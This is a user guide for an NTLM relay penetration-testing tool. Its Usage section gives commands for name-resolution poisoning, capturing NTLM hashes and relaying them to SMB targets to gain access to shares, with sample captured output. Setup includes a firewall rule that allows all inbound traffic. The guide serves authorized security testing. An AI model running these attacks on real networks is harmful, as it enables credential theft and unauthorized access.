# NTLM Relay Tool - User Guide

[![Python](https://img.shields.io/badge/python-3.11+-blue.svg)](https://python.org)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)

## 📋 Introduction

The NTLM Relay Tool is a comprehensive cybersecurity framework designed for authorized testing and analysis of NTLM authentication vulnerabilities in Windows network environments. This tool provides:

- **Real-time NTLM Capture**: Live monitoring and extraction of NTLM authentication attempts
- **Network Poisoning**: Built-in LLMNR/NBT-NS/mDNS responder for triggering authentication
- **Credential Relaying**: Forward captured credentials to target services (SMB, LDAP, HTTP/HTTPS)
- **Hash Processing**: NTLM hash extraction, analysis, and optional cracking capabilities
- **Persistent Storage**: MongoDB integration for comprehensive data storage and analysis
- **Multi-mode Operation**: Flexible operational modes for different testing scenarios

## ⚠️ Legal Disclaimer

**This tool is for authorized security testing and educational purposes only.** Users must:
- Have explicit written permission to test target networks
- Comply with all applicable laws and regulations
- Use this tool responsibly and ethically
- Not use this tool for malicious purposes

## 🔧 System Requirements

### Hardware Requirements
- **CPU**: Multi-core processor (minimum 2 cores recommended)
- **RAM**: 4GB minimum, 8GB recommended for large captures
- **Storage**: 10GB available space for logs and database
- **Network**: Ethernet interface with packet capture capabilities

### Software Requirements
- **Python**: 3.11 or higher
- **Operating System**: Windows 10+ (with Npcap), Linux (Ubuntu 18.04+), macOS 10.15+
- **Database**: MongoDB 4.4 or higher
- **Privileges**: Administrator/root privileges required for packet capture

## 📦 Installation

### 1. Clone the Repository
```powershell
git clone https://github.com/Wafaeel-65/ntlmrelaytool.git
cd ntlmrelaytool
```

### 2. Create Virtual Environment
```powershell
# Create virtual environment
python -m venv venv

# Activate virtual environment (Windows)
.\venv\Scripts\Activate.ps1

# For Linux/macOS
# source venv/bin/activate
```

### 3. Install Dependencies
```powershell
# Install Python packages
pip install -r requirements.txt

# Windows: Install Npcap (required for packet capture)
# Download from: https://nmap.org/npcap/
# Install with WinPcap compatibility mode enabled
```

### 4. Install and Configure MongoDB
```powershell
# Option 1: Install MongoDB locally
# Download from: https://www.mongodb.com/try/download/community

# Option 2: Use Docker
docker run -d -p 27017:27017 --name mongodb mongo:latest

# Option 3: Use MongoDB Atlas (cloud)
# Configure connection string in config/mongodb.ini
```

## ⚙️ Configuration

### 1. MongoDB Configuration
Edit `config/mongodb.ini`:

```ini
[mongodb]
host = localhost
port = 27017
database = ntlm_relay
username = 
password = 
auth_source = admin
connection_timeout = 5000
retry_writes = true
```

### 2. Logging Configuration
Edit `config/logging.ini`:

```ini
[loggers]
keys = root,capture,exploit,storage

[handlers]
keys = consoleHandler,fileHandler,auditHandler

[formatters]
keys = standard,audit

[logger_root]
level = INFO
handlers = consoleHandler,fileHandler

[handler_fileHandler]
class = handlers.RotatingFileHandler
level = INFO
formatter = standard
args = ('app.log', 'a', 10485760, 5)
```

### 3. Network Interface Setup

#### Windows Setup
```powershell
# List available interfaces
python scripts/list_interfaces.py

# Configure Windows Firewall (if needed)
New-NetFirewallRule -DisplayName "NTLM Relay Tool" -Direction Inbound -Action Allow -Protocol Any
```

#### Linux Setup
```bash
# Install libpcap
sudo apt-get install libpcap-dev

# Set capabilities for non-root capture (optional)
sudo setcap cap_net_raw+ep $(which python3)

# List interfaces
python scripts/list_interfaces.py
```

### 4. Verify Installation
```powershell
# Test MongoDB connectivity
python scripts/test_mongodb.py

# Test hash handling
python scripts/test_hash_handler.py

# Run basic tests
pytest tests/
```

## 🚀 Usage

### Prerequisites
- Run as Administrator/root for packet capture capabilities
- Ensure MongoDB is running and accessible
- Configure network interfaces appropriately
- Verify firewall settings allow necessary traffic

### Command Overview
The tool supports four primary operational modes:

| Command | Description | Required Arguments | Optional Arguments |
|---------|-------------|-------------------|-------------------|
| `poison` | Active network poisoning | `--interface` | `--debug` |
| `relay` | Credential relaying | `--interface`, `--target` | `--debug` |
| `attack` | Combined operations | `--interface`, `--target` | `--debug` |
| `list` | View captured data | None | None |

### 1. List Network Interfaces
```powershell
# List all available network interfaces
python scripts/list_interfaces.py

# Example output:
# Available interfaces:
# - Ethernet: 192.168.1.100
# - Wi-Fi: 192.168.1.101
# - Loopback: 127.0.0.1
```

### 2. Poisoning Mode (LLMNR/NBT-NS/mDNS)
Actively trigger NTLM authentication through name resolution poisoning:

```powershell
# Basic poisoning on specific interface
python src/main.py poison --interface "Ethernet"

# With debug logging for detailed output
python src/main.py poison --interface "Ethernet" --debug

# Example with IP address
python src/main.py poison --interface "192.168.1.100"
```

**What this does:**
- Starts LLMNR (port 5355), NBT-NS (port 137), and mDNS (port 5353) responders
- Responds to name resolution queries with attacker IP
- Starts HTTP (port 8080) and SMB (port 8445) authentication servers
- Captures NTLM authentication attempts triggered by poisoning
- Stores captured hashes and authentication data in MongoDB

### 3. Relay Mode
Forward captured NTLM authentication to target services:

```powershell
# SMB relay to single target
python src/main.py relay --interface "Ethernet" --target "192.168.1.100"

# With debug mode for detailed logging
python src/main.py relay --interface "Ethernet" --target "192.168.1.100" --debug

# Using interface IP instead of name
python src/main.py relay --interface "192.168.1.50" --target "192.168.1.100"
```

**What this does:**
- Sets up SMB relay server on specified interface
- Waits for incoming NTLM authentication attempts
- Forwards authentication to target SMB service
- Attempts to gain access to target shares
- Reports success/failure of relay attempts
- Stores relay results in MongoDB

### 4. Attack Mode (Combined Operations)
Run poisoning and relaying simultaneously for comprehensive testing:

```powershell
# Full attack mode with poisoning and relaying
python src/main.py attack --interface "Ethernet" --target "192.168.1.100"

# With debug mode for detailed logging
python src/main.py attack --interface "Ethernet" --target "192.168.1.100" --debug
```

**What this does:**
- Combines poisoning and relaying in concurrent threads
- Actively triggers authentication via network poisoning
- Simultaneously relays captured credentials to target
- Provides comprehensive attack simulation
- Logs all activities to MongoDB and log files

### 5. List Captured Results
View stored authentication attempts and analysis results:

```powershell
# Display all captured authentication attempts
python src/main.py list

# Example output:
# Captured Authentication Attempts:
# [2024-12-14 10:30:15] Source: 192.168.1.50 -> Target: 192.168.1.100
#   Domain: CORP, Username: alice
#   NTLM Hash: 5e884898da28047151d0e56f8dc6292...
#   Protocol: SMB, Status: Success
```

## Additional Scripts
- `scripts/setup_db.py`: Initialize MongoDB collections.
- `scripts/setup_mongodb.py`: Launch a local MongoDB instance (Docker).
- `scripts/cleanup.py`: Remove logs and temporary data.

## Logging
All tool output is logged to `ntlm_relay.log` and to console. Adjust `config/logging.ini` for verbosity and log destinations.

## Troubleshooting
- Ensure you run commands with administrator/root privileges.
- Confirm dependencies are installed and config files are correct.
- Review `ntlm_relay.log` and `app.log` for errors.

For further details, see the Technical Documentation in `docs/technical.md` and the project README.